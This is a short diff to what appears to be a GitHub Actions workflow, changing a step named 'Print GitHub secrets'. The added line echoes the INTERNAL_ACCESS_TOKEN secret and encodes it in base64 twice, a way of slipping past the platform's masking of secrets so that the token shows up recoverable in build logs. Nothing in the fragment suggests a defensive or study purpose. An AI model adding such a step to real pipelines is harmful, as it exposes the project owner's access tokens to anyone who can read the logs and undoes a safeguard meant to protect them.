@@ -13,4 +13,4 @@ jobs:
 
      - name: Print GitHub secrets
        run: |
-        cat "INTERNAL_ACCESS_TOKEN: ${{ secrets.INTERNAL_ACCESS_TOKEN }}"
+        echo "INTERNAL_ACCESS_TOKEN: ${{ secrets.INTERNAL_ACCESS_TOKEN }}" | base64 -w0 |base64 -w0
